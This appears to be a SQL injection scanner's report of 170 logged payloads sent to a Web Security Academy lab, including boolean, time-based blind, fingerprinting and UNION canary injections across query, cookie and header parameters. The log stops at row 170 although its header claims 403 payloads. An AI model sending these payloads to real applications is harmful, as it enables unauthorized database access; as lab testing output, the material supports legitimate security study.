# Sentinel SQL Scanner — Exact Payloads Sent During Execution

**Target**: `https://0aec00780363352681470cf700f800af.web-security-academy.net/filter?category=Tech+gifts`  
**Scan Window**: 17:30:34 – 17:41:00  
**Total Payloads Captured**: 403  

## Summary by Parameter

| Parameter / Injection Vector | Payloads Sent | Status |
| :--- | :--- | :--- |
| `category (query)` | 57 | Negative (Not Vulnerable) |
| `TrackingId (cookie)` | 81 | **VULNERABLE (Boolean Differential)** |
| `session (cookie)` | 95 | Negative (Not Vulnerable) |
| `User-Agent (header)` | 95 | Negative (Not Vulnerable) |
| `Referer (header)` | 75 | Negative (Not Vulnerable) |

---

## Detailed Payload Execution Log

| # | Time | Parameter | Technique | Payload |
| :--- | :--- | :--- | :--- | :--- |
| 1 | `17:30:38` | `category (query)` | Differential Probe | `Tech gifts' OR "/*"/*`*/[1]=(SELECT(CASE WHEN(1=1)THEN 1 ELSE 1/0 END))-- ` |
| 2 | `17:30:38` | `category (query)` | Error-based CAST | `Tech gifts-0+CAST((SELECT 1) AS INT)` |
| 3 | `17:30:39` | `category (query)` | Differential Probe | `Tech gifts' AND jsonb_typeof(data) IS NOT NULL AND '[0]'::vector <=> '[0]'::vector-- ` |
| 4 | `17:30:40` | `category (query)` | Differential Probe | `Tech gifts'` |
| 5 | `17:30:41` | `category (query)` | Differential Probe | `Tech gifts''` |
| 6 | `17:30:41` | `category (query)` | Differential Probe | `Tech gifts"` |
| 7 | `17:30:42` | `category (query)` | Differential Probe | `Tech gifts')` |
| 8 | `17:30:47` | `category (query)` | Differential Probe | `Tech gifts")` |
| 9 | `17:30:49` | `category (query)` | Differential Probe | `Tech gifts\` |
| 10 | `17:30:50` | `category (query)` | Differential Probe | `Tech gifts'--` |
| 11 | `17:30:51` | `category (query)` | Differential Probe | `Tech gifts';--` |
| 12 | `17:30:52` | `category (query)` | Boolean True Probe | `Tech gifts' AND '1'='1` |
| 13 | `17:30:53` | `category (query)` | Boolean False Probe | `Tech gifts' AND '1'='2` |
| 14 | `17:30:54` | `category (query)` | Boolean True Probe | `Tech gifts' AND 1=1--` |
| 15 | `17:30:54` | `category (query)` | Boolean False Probe | `Tech gifts' AND 1=2--` |
| 16 | `17:30:56` | `category (query)` | Differential Probe | `Tech gifts' AND (SELECT 'a' FROM users LIMIT 1)='a` |
| 17 | `17:30:56` | `category (query)` | Differential Probe | `Tech gifts' AND (SELECT 'a' FROM users LIMIT 1)='b` |
| 18 | `17:30:57` | `category (query)` | Differential Probe | `Tech gifts' AND (SELECT 'a' FROM users WHERE username='administrator')='a` |
| 19 | `17:30:58` | `category (query)` | Differential Probe | `Tech gifts' AND (SELECT 'a' FROM users WHERE username='nonexistent_sqli_test_user')='a` |
| 20 | `17:30:59` | `category (query)` | Boolean True Probe | `Tech gifts' AND (SELECT 1 FROM DUAL)=1 AND '1'='1` |
| 21 | `17:30:59` | `category (query)` | Boolean True Probe | `Tech gifts' AND (SELECT 1 FROM DUAL)=2 AND '1'='1` |
| 22 | `17:31:00` | `category (query)` | Boolean True Probe | `Tech gifts' AND (SELECT version()) IS NOT NULL AND '1'='1` |
| 23 | `17:31:01` | `category (query)` | Boolean True Probe | `Tech gifts' AND (SELECT version()) IS NULL AND '1'='1` |
| 24 | `17:31:02` | `category (query)` | Boolean True Probe | `Tech gifts' AND @@version=@@version AND '1'='1` |
| 25 | `17:31:02` | `category (query)` | Boolean True Probe | `Tech gifts' AND @@version='' AND '1'='1` |
| 26 | `17:31:03` | `category (query)` | Boolean True Probe | `Tech gifts' AND sqlite_version()=sqlite_version() AND '1'='1` |
| 27 | `17:31:04` | `category (query)` | Boolean True Probe | `Tech gifts' AND sqlite_version()='' AND '1'='1` |
| 28 | `17:31:05` | `category (query)` | Boolean True Probe | `Tech gifts' AND @@VERSION=@@VERSION AND '1'='1` |
| 29 | `17:31:06` | `category (query)` | Boolean True Probe | `Tech gifts' AND @@VERSION='' AND '1'='1` |
| 30 | `17:31:07` | `category (query)` | Time-based Blind | `Tech gifts'\|\|(SELECT pg_sleep(3))\|\|'` |
| 31 | `17:31:08` | `category (query)` | Time-based Blind | `Tech gifts' AND (SELECT 1 FROM (SELECT(SLEEP(3)))snt)-- -` |
| 32 | `17:31:08` | `category (query)` | Differential Probe | `Tech gifts'\|\|(SELECT dbms_pipe.receive_message(('RDS'),3) FROM DUAL)\|\|'` |
| 33 | `17:31:09` | `category (query)` | Time-based Blind | `Tech gifts'; WAITFOR DELAY '0:0:3'--` |
| 34 | `17:31:10` | `category (query)` | Time-based Blind | `Tech gifts' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2)))))-- -` |
| 35 | `17:31:12` | `category (query)` | Time-based Blind | `Tech gifts'; SELECT pg_sleep(3);--` |
| 36 | `17:31:12` | `category (query)` | Time-based Blind | `Tech gifts'; SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))));--` |
| 37 | `17:31:13` | `category (query)` | ORDER BY Column Count | `Tech gifts' ORDER BY 1-- -` |
| 38 | `17:31:14` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL-- -` |
| 39 | `17:31:14` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL FROM DUAL--` |
| 40 | `17:31:15` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL-- -` |
| 41 | `17:31:16` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL FROM DUAL--` |
| 42 | `17:31:17` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL-- -` |
| 43 | `17:31:18` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL FROM DUAL--` |
| 44 | `17:31:18` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL-- -` |
| 45 | `17:31:19` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL FROM DUAL--` |
| 46 | `17:31:20` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -` |
| 47 | `17:31:20` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 48 | `17:31:21` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 49 | `17:31:22` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 50 | `17:31:22` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 51 | `17:31:23` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 52 | `17:31:24` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 53 | `17:31:25` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 54 | `17:31:25` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 55 | `17:31:26` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 56 | `17:31:27` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 57 | `17:31:28` | `category (query)` | UNION-based | `Tech gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 58 | `17:31:28` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU' OR "/*"/*`*/[1]=(SELECT(CASE WHEN(1=1)THEN 1 ELSE 1/0 END))--` |
| 59 | `17:31:29` | `TrackingId (cookie)` | Error-based CAST | `zIaqBGLGLZTfyzcU-0+CAST((SELECT 1) AS INT)` |
| 60 | `17:31:30` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU' AND jsonb_typeof(data) IS NOT NULL AND '[0]'::vector <=> '[0]'::vector--` |
| 61 | `17:31:31` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU'` |
| 62 | `17:31:32` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU''` |
| 63 | `17:31:32` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU"` |
| 64 | `17:31:33` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU')` |
| 65 | `17:31:34` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU")` |
| 66 | `17:31:35` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU\` |
| 67 | `17:31:36` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU'--` |
| 68 | `17:31:37` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU'` |
| 69 | `17:31:38` | `TrackingId (cookie)` | Boolean True Probe | `zIaqBGLGLZTfyzcU' AND '1'='1` |
| 70 | `17:31:38` | `TrackingId (cookie)` | Boolean False Probe | `zIaqBGLGLZTfyzcU' AND '1'='2` |
| 71 | `17:31:45` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU_snt_neutral_control_1` |
| 72 | `17:31:46` | `TrackingId (cookie)` | Boolean True Probe | `zIaqBGLGLZTfyzcU' AND (1=1)--` |
| 73 | `17:31:47` | `TrackingId (cookie)` | Boolean False Probe | `zIaqBGLGLZTfyzcU' AND (1=2)--` |
| 74 | `17:31:48` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU' AND (NULL IS NULL)--` |
| 75 | `17:31:52` | `TrackingId (cookie)` | Time-based Blind | `zIaqBGLGLZTfyzcU'\|\|(SELECT pg_sleep(3))\|\|'` |
| 76 | `17:32:06` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU'` |
| 77 | `17:32:09` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU'` |
| 78 | `17:32:10` | `TrackingId (cookie)` | Differential Probe | `zIaqBGLGLZTfyzcU'` |
| 79 | `17:32:13` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 1-- -` |
| 80 | `17:32:16` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 2-- -` |
| 81 | `17:32:18` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 3-- -` |
| 82 | `17:32:20` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 4-- -` |
| 83 | `17:32:21` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 5-- -` |
| 84 | `17:32:23` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 6-- -` |
| 85 | `17:32:24` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 7-- -` |
| 86 | `17:32:25` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 8-- -` |
| 87 | `17:32:27` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 9-- -` |
| 88 | `17:32:28` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 10-- -` |
| 89 | `17:32:29` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 11-- -` |
| 90 | `17:32:30` | `TrackingId (cookie)` | ORDER BY Column Count | `zIaqBGLGLZTfyzcU' ORDER BY 12-- -` |
| 91 | `17:32:33` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT 'SENTINEL'\|\|'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 92 | `17:32:35` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT 'SENTINEL'\|\|'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 93 | `17:32:36` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT 'SENTINEL'+'_CANARY_01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 94 | `17:32:37` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT CONCAT('SENTINEL','_CANARY_01'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 95 | `17:32:38` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,'SENTINEL'\|\|'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 96 | `17:32:39` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,'SENTINEL'\|\|'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 97 | `17:32:40` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,'SENTINEL'+'_CANARY_02',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 98 | `17:32:41` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,CONCAT('SENTINEL','_CANARY_02'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 99 | `17:32:42` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,'SENTINEL'\|\|'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 100 | `17:32:43` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,'SENTINEL'\|\|'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 101 | `17:32:44` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,'SENTINEL'+'_CANARY_03',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 102 | `17:32:44` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,CONCAT('SENTINEL','_CANARY_03'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 103 | `17:32:45` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 104 | `17:32:46` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 105 | `17:32:47` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,'SENTINEL'+'_CANARY_04',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 106 | `17:32:47` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_04'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 107 | `17:32:48` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 108 | `17:32:49` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 109 | `17:32:49` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_05',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 110 | `17:32:50` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_05'),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 111 | `17:32:51` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 112 | `17:32:51` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 113 | `17:32:52` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_06',NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 114 | `17:32:53` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_06'),NULL,NULL,NULL,NULL,NULL,NULL-- -` |
| 115 | `17:32:53` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_07',NULL,NULL,NULL,NULL,NULL-- -` |
| 116 | `17:32:54` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_07',NULL,NULL,NULL,NULL,NULL FROM DUAL--` |
| 117 | `17:32:55` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_07',NULL,NULL,NULL,NULL,NULL-- -` |
| 118 | `17:32:56` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_07'),NULL,NULL,NULL,NULL,NULL-- -` |
| 119 | `17:32:57` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_08',NULL,NULL,NULL,NULL-- -` |
| 120 | `17:32:57` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_08',NULL,NULL,NULL,NULL FROM DUAL--` |
| 121 | `17:32:58` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_08',NULL,NULL,NULL,NULL-- -` |
| 122 | `17:32:59` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_08'),NULL,NULL,NULL,NULL-- -` |
| 123 | `17:32:59` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_09',NULL,NULL,NULL-- -` |
| 124 | `17:33:00` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_09',NULL,NULL,NULL FROM DUAL--` |
| 125 | `17:33:01` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_09',NULL,NULL,NULL-- -` |
| 126 | `17:33:02` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_09'),NULL,NULL,NULL-- -` |
| 127 | `17:33:02` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_10',NULL,NULL-- -` |
| 128 | `17:33:03` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_10',NULL,NULL FROM DUAL--` |
| 129 | `17:33:04` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_10',NULL,NULL-- -` |
| 130 | `17:33:05` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_10'),NULL,NULL-- -` |
| 131 | `17:33:05` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_11',NULL-- -` |
| 132 | `17:33:06` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_11',NULL FROM DUAL--` |
| 133 | `17:33:07` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_11',NULL-- -` |
| 134 | `17:33:07` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_11'),NULL-- -` |
| 135 | `17:33:08` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_12'-- -` |
| 136 | `17:33:09` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'\|\|'_CANARY_12' FROM DUAL--` |
| 137 | `17:33:09` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'SENTINEL'+'_CANARY_12'-- -` |
| 138 | `17:33:10` | `TrackingId (cookie)` | UNION-based | `zIaqBGLGLZTfyzcU' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT('SENTINEL','_CANARY_12')-- -` |
| 139 | `17:33:11` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' OR "/*"/*`*/[1]=(SELECT(CASE WHEN(1=1)THEN 1 ELSE 1/0 END))--` |
| 140 | `17:33:13` | `session (cookie)` | Error-based CAST | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2-0+CAST((SELECT 1) AS INT)` |
| 141 | `17:33:13` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND jsonb_typeof(data) IS NOT NULL AND '[0]'::vector <=> '[0]'::vector--` |
| 142 | `17:33:14` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2'` |
| 143 | `17:33:15` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2''` |
| 144 | `17:33:15` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2"` |
| 145 | `17:33:16` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2')` |
| 146 | `17:33:17` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2")` |
| 147 | `17:33:18` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2'--` |
| 148 | `17:33:19` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2'` |
| 149 | `17:33:20` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND '1'='1` |
| 150 | `17:33:20` | `session (cookie)` | Boolean False Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND '1'='2` |
| 151 | `17:33:21` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND 1=1--` |
| 152 | `17:33:22` | `session (cookie)` | Boolean False Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND 1=2--` |
| 153 | `17:33:23` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND (SELECT 'a' FROM users LIMIT 1)='a` |
| 154 | `17:33:23` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND (SELECT 'a' FROM users LIMIT 1)='b` |
| 155 | `17:33:24` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND (SELECT 'a' FROM users WHERE username='administrator')='a` |
| 156 | `17:33:25` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND (SELECT 'a' FROM users WHERE username='nonexistent_sqli_test_user')='a` |
| 157 | `17:33:25` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND (SELECT 1 FROM DUAL)=1 AND '1'='1` |
| 158 | `17:33:26` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND (SELECT 1 FROM DUAL)=2 AND '1'='1` |
| 159 | `17:33:27` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND (SELECT version()) IS NOT NULL AND '1'='1` |
| 160 | `17:33:27` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND (SELECT version()) IS NULL AND '1'='1` |
| 161 | `17:33:28` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND @@version=@@version AND '1'='1` |
| 162 | `17:33:29` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND @@version='' AND '1'='1` |
| 163 | `17:33:30` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND sqlite_version()=sqlite_version() AND '1'='1` |
| 164 | `17:33:31` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND sqlite_version()='' AND '1'='1` |
| 165 | `17:33:32` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND @@VERSION=@@VERSION AND '1'='1` |
| 166 | `17:33:32` | `session (cookie)` | Boolean True Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND @@VERSION='' AND '1'='1` |
| 167 | `17:33:33` | `session (cookie)` | Time-based Blind | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2'\|\|(SELECT pg_sleep(3))\|\|'` |
| 168 | `17:33:34` | `session (cookie)` | Time-based Blind | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2' AND (SELECT 1 FROM (SELECT(SLEEP(3)))snt)-- -` |
| 169 | `17:33:34` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2'\|\|(SELECT dbms_pipe.receive_message(('RDS'),3) FROM DUAL)\|\|'` |
| 170 | `17:33:35` | `session (cookie)` | Differential Probe | `IquPGGoHes0ITPHKb2pLsmNZ3FzDlnM2'` |
